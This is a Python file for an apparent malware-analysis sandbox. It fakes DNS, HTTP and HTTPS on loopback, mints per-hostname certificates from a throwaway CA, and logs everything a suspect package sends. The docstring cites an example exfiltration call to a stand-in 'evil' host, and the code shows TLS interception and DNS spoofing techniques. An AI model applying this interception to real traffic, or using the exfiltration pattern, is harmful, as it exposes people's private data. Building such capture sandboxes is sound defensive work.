"""The sandbox's fake internet. Runs INSIDE a network-blocked Modal sandbox and pretends to be
every host the package tries to reach, so we can record exactly what it sends and to whom.

Three servers, all on loopback (the only network a blocked sandbox has):
  * DNS on :53 answers every lookup with 127.0.0.1 / ::1 and logs the name.
  * HTTP on :80 and HTTPS on :443 answer everything 200 and log method, host, path, headers, body.

HTTPS is terminated with a throwaway CA generated at startup: an SNI callback mints a leaf cert for
whatever hostname the client asks for, signed by that CA. The runner trusts the CA (NODE_EXTRA_CA_CERTS
etc.), so a package's `fetch("https://evil/..", {body})` completes and we capture the plaintext body —
including any secret it tried to smuggle out. Nothing can actually leave: egress is blocked and every
name resolves to loopback. Every event is appended as one JSON line to the log, flushed immediately.

Run:  python3 sink.py --log /var/log/bawabu-sink.jsonl --ca /opt/bawabu/ca.pem --ready /tmp/sink.ready
"""

from __future__ import annotations

import argparse
import base64
import datetime
import http.server
import json
import os
import signal
import socket
import socketserver
import ssl
import struct
import tempfile
import threading
import time

from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.x509.oid import NameOID

MAX_BODY = 64 * 1024
_log_lock = threading.Lock()
_log_path = "/var/log/bawabu-sink.jsonl"


def record(event: dict) -> None:
    event["t"] = round(time.time(), 3)
    line = json.dumps(event, ensure_ascii=False)
    with _log_lock:
        with open(_log_path, "a", encoding="utf-8") as fh:
            fh.write(line + "\n")
            fh.flush()


# ---------------------------------------------------------------------------- certificates
class CertFactory:
    """A startup-time CA that mints one leaf cert per requested hostname (SNI), cached."""

    def __init__(self, ca_cert_out: str):
        self._key = ec.generate_private_key(ec.SECP256R1())
        name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "Bawabu Sandbox Sink CA")])
        now = datetime.datetime.now(datetime.timezone.utc)
        ca_ski = x509.SubjectKeyIdentifier.from_public_key(self._key.public_key())
        self._ca = (
            x509.CertificateBuilder()
            .subject_name(name).issuer_name(name)
            .public_key(self._key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(now - datetime.timedelta(days=1))
            .not_valid_after(now + datetime.timedelta(days=3650))
            .add_extension(x509.BasicConstraints(ca=True, path_length=0), critical=True)
            .add_extension(x509.KeyUsage(
                digital_signature=False, content_commitment=False, key_encipherment=False,
                data_encipherment=False, key_agreement=False, key_cert_sign=True,
                crl_sign=True, encipher_only=False, decipher_only=False), critical=True)
            .add_extension(ca_ski, critical=False)
            .sign(self._key, hashes.SHA256())
        )
        self._ca_ski = ca_ski
        with open(ca_cert_out, "wb") as fh:
            fh.write(self._ca.public_bytes(serialization.Encoding.PEM))
        self._leaf_key = ec.generate_private_key(ec.SECP256R1())
        self._leaf_key_pem = self._leaf_key.private_bytes(
            serialization.Encoding.PEM,
            serialization.PrivateFormat.TraditionalOpenSSL,
            serialization.NoEncryption(),
        )
        self._cache: dict[str, str] = {}
        self._lock = threading.Lock()

    def cert_path(self, hostname: str) -> str:
        host = hostname or "localhost"
        with self._lock:
            path = self._cache.get(host)
            if not path:
                path = self._mint(host)
                self._cache[host] = path
            return path

    def context_for(self, hostname: str) -> ssl.SSLContext:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(self.cert_path(hostname))
        return ctx

    def _mint(self, host: str) -> str:
        now = datetime.datetime.now(datetime.timezone.utc)
        try:
            san = x509.DNSName(host)
        except ValueError:
            san = x509.DNSName("localhost")
        cert = (
            x509.CertificateBuilder()
            .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, host[:60])]))
            .issuer_name(self._ca.subject)
            .public_key(self._leaf_key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(now - datetime.timedelta(days=1))
            .not_valid_after(now + datetime.timedelta(days=365))
            .add_extension(x509.SubjectAlternativeName([san]), critical=False)
            .add_extension(x509.SubjectKeyIdentifier.from_public_key(self._leaf_key.public_key()), critical=False)
            .add_extension(x509.AuthorityKeyIdentifier.from_issuer_public_key(self._key.public_key()), critical=False)
            .add_extension(x509.ExtendedKeyUsage([x509.oid.ExtendedKeyUsageOID.SERVER_AUTH]), critical=False)
            .sign(self._key, hashes.SHA256())
        )
        fd, path = tempfile.mkstemp(suffix=".pem")
        with os.fdopen(fd, "wb") as fh:
            fh.write(cert.public_bytes(serialization.Encoding.PEM))
            fh.write(self._leaf_key_pem)
        return path


# ---------------------------------------------------------------------------- DNS
class DNSHandler(socketserver.BaseRequestHandler):
    def handle(self) -> None:
        data, sock = self.request
        if len(data) < 12:
            return
        name, qtype = self._question(data)
        record({"kind": "dns", "name": name, "qtype": "AAAA" if qtype == 28 else "A" if qtype == 1 else str(qtype)})
        sock.sendto(self._answer(data, qtype), self.client_address)

    @staticmethod
    def _question(data: bytes) -> tuple[str, int]:
        i, labels = 12, []
        while i < len(data) and data[i] != 0:
            length = data[i]
            labels.append(data[i + 1 : i + 1 + length].decode("latin-1"))
            i += 1 + length
        qtype = struct.unpack("!H", data[i + 1 : i + 3])[0] if i + 3 <= len(data) else 1
        return ".".join(labels), qtype

    @staticmethod
    def _answer(query: bytes, qtype: int) -> bytes:
        qend = 12
        while qend < len(query) and query[qend] != 0:
            qend += 1 + query[qend]
        question = query[12 : qend + 5]  # labels + null + qtype + qclass
        header = query[:2] + struct.pack("!HHHHH", 0x8180, 1, 1, 0, 0)
        if qtype == 28:
            rdata = socket.inet_pton(socket.AF_INET6, "::1")
            rtype = 28
        else:
            rdata = socket.inet_aton("127.0.0.1")
            rtype = 1
        answer = b"\xc0\x0c" + struct.pack("!HHIH", rtype, 1, 30, len(rdata)) + rdata
        return header + question + answer


class ThreadingUDPServer(socketserver.ThreadingMixIn, socketserver.UDPServer):
    allow_reuse_address = True
    daemon_threads = True


# ---------------------------------------------------------------------------- HTTP(S)
class SinkHTTPHandler(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    scheme = "http"

    def log_message(self, *args) -> None:  # silence default stderr logging
        pass

    def _handle(self) -> None:
        length = int(self.headers.get("Content-Length", 0) or 0)
        raw = self.rfile.read(min(length, MAX_BODY)) if length else b""
        host = (self.headers.get("Host", "") or "").rsplit(":", 1)[0]
        event = {
            "kind": "http", "scheme": self.scheme, "host": host,
            "method": self.command, "path": self.path,
            "headers": {k: v for k, v in self.headers.items()},
        }
        try:
            event["body_text"] = raw.decode("utf-8")
        except UnicodeDecodeError:
            event["body_b64"] = base64.b64encode(raw).decode()
        record(event)
        body = b'{"ok":true}'
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    do_GET = do_POST = do_PUT = do_DELETE = do_PATCH = do_HEAD = do_OPTIONS = _handle


class ThreadingHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    allow_reuse_address = True
    daemon_threads = True


def _https_server(factory: CertFactory, port: int) -> ThreadingHTTPServer:
    handler = type("HTTPSHandler", (SinkHTTPHandler,), {"scheme": "https"})
    server = ThreadingHTTPServer(("0.0.0.0", port), handler)
    base = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    base.load_cert_chain(factory.cert_path("localhost"))  # default cert for the initial handshake
    base.sni_callback = lambda sock, name, ctx: setattr(sock, "context", factory.context_for(name or "localhost"))
    server.socket = base.wrap_socket(server.socket, server_side=True)
    return server


def serve(log: str, ca: str, ready: str, dns_port: int, http_port: int, https_port: int) -> list:
    """Start all three servers in daemon threads and write the ready marker. Returns the servers."""
    global _log_path
    _log_path = log
    open(_log_path, "w").close()

    factory = CertFactory(ca)
    servers = [
        ThreadingUDPServer(("0.0.0.0", dns_port), DNSHandler),
        ThreadingHTTPServer(("0.0.0.0", http_port), SinkHTTPHandler),
        _https_server(factory, https_port),
    ]
    for srv in servers:
        threading.Thread(target=srv.serve_forever, daemon=True).start()
    with open(ready, "w") as fh:
        fh.write("ready\n")
    record({"kind": "sink", "note": f"sink ready: DNS:{dns_port} HTTP:{http_port} HTTPS:{https_port}"})
    return servers


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--log", default="/var/log/bawabu-sink.jsonl")
    ap.add_argument("--ca", default="/opt/bawabu/ca.pem")
    ap.add_argument("--ready", default="/tmp/sink.ready")
    ap.add_argument("--dns-port", type=int, default=53)
    ap.add_argument("--http-port", type=int, default=80)
    ap.add_argument("--https-port", type=int, default=443)
    args = ap.parse_args()
    serve(args.log, args.ca, args.ready, args.dns_port, args.http_port, args.https_port)

    stop = threading.Event()
    signal.signal(signal.SIGTERM, lambda *_: stop.set())
    signal.signal(signal.SIGINT, lambda *_: stop.set())
    stop.wait()


if __name__ == "__main__":
    main()
